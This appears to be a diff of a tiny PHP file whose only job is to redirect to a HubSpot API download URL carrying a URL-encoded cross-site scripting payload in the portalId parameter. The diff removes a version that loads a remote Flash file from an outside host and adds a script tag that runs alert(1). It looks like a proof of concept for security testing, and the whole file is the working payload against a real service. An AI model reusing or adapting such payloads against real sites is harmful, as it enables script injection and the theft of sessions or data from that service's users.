@@ -1,6 +1,6 @@
 <?php 
 
-header("Location: https://api.hubapi.com/presentations/v1/revisit/12655263/2943245/download?portalId=%3Cembed/:script%20allowscriptaccess=always%20src=//l0.cm/xss.swf%3E
+header("Location: https://api.hubapi.com/presentations/v1/revisit/12655263/2943245/download?portalId=%3Cscript/%26%3Ealert(1)%3C/script%3E
 ")
 
 
